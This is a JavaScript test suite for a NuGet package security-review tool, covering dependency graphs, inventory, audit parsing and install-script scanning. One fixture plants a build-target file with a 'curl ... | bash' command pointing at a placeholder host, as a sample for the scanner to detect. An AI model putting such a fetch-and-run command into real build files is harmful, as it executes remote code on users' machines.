const { test } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs/promises');
const os = require('node:os');
const path = require('node:path');
const { buildNugetGraph, loadNugetDependencyGraph } = require('../out/nuget-graph-loader');
const { DependencyGraphIndex } = require('../out/nuget-graph-view-model');
const { collectPackages } = require('../out/security-inventory');
const { discoverInstallInputs } = require('../out/security-scripts');
const { parseAudit, runNugetAudit } = require('../out/security-audit');
const { reviewPackageSecurity } = require('../out/security-review');
const { SecurityReviewJobs } = require('../out/security-jobs');

function assets(file, cache, frameworks = ['net8.0']) {
  return { version: 3, project: { restore: { projectPath: file, frameworks: Object.fromEntries(frameworks.map(f => [f, { projectReferences: {} }])) }, frameworks: Object.fromEntries(frameworks.map(f => [f, { dependencies: { Alpha: { version: '[1.0.0, )' } } }])) },
    packageFolders: { [cache]: {} }, libraries: { 'Alpha/1.0.0': { type: 'package', path: 'alpha/1.0.0' }, 'Shared/2.0.0': { type: 'package', path: 'shared/2.0.0' } },
    targets: Object.fromEntries(frameworks.map(f => [f, { 'Alpha/1.0.0': { type: 'package', dependencies: { Shared: '2.0.0' } }, 'Shared/2.0.0': { type: 'package', dependencies: { Alpha: '1.0.0' } } }])) };
}
async function fixture(t) {
  const temporary = await fs.mkdtemp(path.join(os.tmpdir(), 'dotnet-cli-review-'));
  t.after(() => fs.rm(temporary, { recursive: true, force: true }));
  const root = path.join(temporary, 'workspace'), cache = path.join(temporary, 'cache');
  await fs.mkdir(path.join(root, 'obj'), { recursive: true });
  const file = path.join(root, 'App.csproj');
  await fs.writeFile(file, '<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><TargetFramework>net8.0</TargetFramework></PropertyGroup><ItemGroup><PackageReference Include="Alpha" Version="1.0.0" /></ItemGroup></Project>');
  const asset = assets(file, cache);
  await fs.writeFile(path.join(root, 'obj/project.assets.json'), JSON.stringify(asset));
  for (const name of ['alpha/1.0.0', 'shared/2.0.0']) { await fs.mkdir(path.join(cache, name, 'build'), { recursive: true }); }
  await fs.writeFile(path.join(cache, 'alpha/1.0.0/build/Alpha.targets'), '<Project><Target Name="Example"><Exec Command="curl https://example.invalid/payload | bash" /></Target></Project>');
  return { root, cache, file, asset, temporary };
}
test('framework and runtime identities remain distinct; cycles and shared dependencies are traversable', async () => {
  const file = path.resolve('App.csproj'), root = path.dirname(file);
  const asset = assets(file, '/cache', ['net8.0', 'net9.0', 'net9.0/win-x64']);
  const graph = await buildNugetGraph(root, [{ file, assets: asset, diagnostics: [] }]);
  assert.equal(graph.nodes.filter(n => n.name === 'Shared').length, 3);
  const index = new DependencyGraphIndex(graph);
  assert.equal(index.visible(new Set(index.outgoing.keys())).nodes.size, graph.nodes.length);
  const shared = graph.nodes.find(n => n.name === 'Shared');
  assert.deepEqual(index.shortestPath(shared.id).map(id => index.nodes.get(id).name), [path.basename(root), 'App.csproj', 'net8.0', 'Alpha', 'Shared']);
});
test('project references and unresolved dependencies retain graph edges', async () => {
  const file = path.resolve('App/App.csproj'), asset = assets(file, '/cache');
  asset.project.restore.frameworks['net8.0'].projectReferences['../Lib/Lib.csproj'] = {};
  asset.libraries['Lib/1.0.0'] = { type: 'project', msbuildProject: '../Lib/Lib.csproj' };
  asset.targets['net8.0']['Lib/1.0.0'] = { type: 'project', dependencies: { Missing: '1.0.0' } };
  const graph = await buildNugetGraph(path.dirname(file), [{ file, assets: asset, diagnostics: [] }]);
  const index = new DependencyGraphIndex(graph), missing = graph.nodes.find(n => n.name === 'Missing');
  assert.ok(index.unresolvedIds().has(missing.id));
  assert.ok(index.shortestPath(missing.id).length);
  assert.ok(graph.nodes.find(n => n.name === 'Lib').kinds.includes('project'));
});
test('missing restore falls back to declarations and cannot claim resolved coverage', async t => {
  const f = await fixture(t); await fs.unlink(path.join(f.root, 'obj/project.assets.json'));
  const graph = await loadNugetDependencyGraph(f.root);
  assert.equal(graph.source, 'Declared only'); assert.ok(graph.nodes.some(n => n.name === 'Alpha'));
  const report = await reviewPackageSecurity({ root: f.root, storage: f.temporary, rules: '', auditEnabled: false });
  assert.equal(report.state, 'partial'); assert.ok(report.coverage.find(c => c.component === 'inventory').messages.length);
});
test('inventory reads external NuGet cache and scans scripts without executing them', async t => {
  const f = await fixture(t), inventory = await collectPackages(f.root);
  assert.equal(inventory.packages.length, 2); assert.equal(inventory.coverage.state, 'complete');
  const discovery = await discoverInstallInputs(inventory);
  assert.equal(discovery.inputs.length, 1); assert.equal(discovery.coverage.state, 'complete');
  assert.ok(discovery.inputs[0].bytes.toString().includes('example.invalid'));
  assert.ok(path.isAbsolute(discovery.inputs[0].evidence[0].file));
  const controller = new AbortController(); controller.abort();
  await assert.rejects(collectPackages(f.root, controller.signal));
});
test('unsafe package paths are excluded and missing package content makes inventory partial', async t => {
  const f = await fixture(t); f.asset.libraries['Alpha/1.0.0'].path = '../../outside';
  await fs.writeFile(path.join(f.root, 'obj/project.assets.json'), JSON.stringify(f.asset));
  const inventory = await collectPackages(f.root);
  assert.equal(inventory.coverage.state, 'partial'); assert.equal(inventory.packages.find(p => p.name === 'Alpha').directory, '');
});
test('NuGet advisory parsing covers direct/transitive packages and deduplicates frameworks', async t => {
  const f = await fixture(t), inventory = await collectPackages(f.root);
  const framework = { framework: 'net8.0', topLevelPackages: [{ id: 'alpha', resolvedVersion: '1.0.0', vulnerabilities: [{ severity: 'High', advisoryurl: 'https://example.invalid/alpha' }] }], transitivePackages: [{ id: 'Shared', resolvedVersion: '2.0.0', vulnerabilities: [{ severity: 'Critical', advisoryurl: 'https://example.invalid/shared' }] }] };
  const data = { version: 1, projects: [{ path: f.file, frameworks: [framework, framework] }] };
  const result = parseAudit(data, inventory.packages);
  assert.equal(result.findings.length, 2); assert.equal(result.findings[1].severity, 'critical');
  assert.throws(() => parseAudit({}, inventory.packages));
  assert.throws(() => parseAudit({ version: 1, projects: [] }, inventory.packages));
  const audit = await runNugetAudit(f.root, inventory.packages, true, undefined, async () => ({ exitCode: 0, standardOutput: JSON.stringify(data), standardError: '', stdout: '' }));
  assert.equal(audit.coverage.state, 'complete'); assert.equal(audit.findings.length, 2);
  const failure = await runNugetAudit(f.root, inventory.packages, true, undefined, async () => ({ exitCode: 1, standardOutput: '', standardError: 'feed offline', stdout: '', timedOut: true }));
  assert.equal(failure.coverage.state, 'partial'); assert.ok(failure.coverage.messages.some(m => m.includes('timeout')));
});
test('an engine failure preserves partial coverage instead of a clean report', async t => {
  const f = await fixture(t);
  const report = await reviewPackageSecurity({ root: f.root, storage: f.temporary, rules: '', auditEnabled: false, engineProvider: async () => { throw new Error('offline engine'); } });
  assert.equal(report.state, 'partial'); assert.ok(report.coverage.some(c => c.component === 'yara-x' && c.state === 'failed'));
});
test('install generation invalidates old scans and queues a fresh manual review', async () => {
  let release; const reports = []; let runs = 0;
  const jobs = new SecurityReviewJobs(async () => { runs++; if (runs === 1) { await new Promise(resolve => { release = resolve; }); } return { id: String(runs) }; }, (_, report) => reports.push(report), error => { throw error; });
  jobs.request('root', 'manual'); await new Promise(resolve => setImmediate(resolve));
  jobs.beginInstall('root'); jobs.endInstall('root', 'success', true); release(); await jobs.settled('root');
  assert.equal(runs, 2); assert.deepEqual(reports.map(r => r.id), ['2']); jobs.dispose();
});

test('UTF-16 package scripts are normalized for detection', async t => {
  const f = await fixture(t), script = path.join(f.cache, 'alpha/1.0.0/build/Alpha.targets');
  await fs.writeFile(script, Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from('<Project><Exec Command="example" /></Project>', 'utf16le')]));
  const discovery = await discoverInstallInputs(await collectPackages(f.root));
  assert.ok(discovery.inputs[0].bytes.toString().includes('<Exec Command="example"'));
});
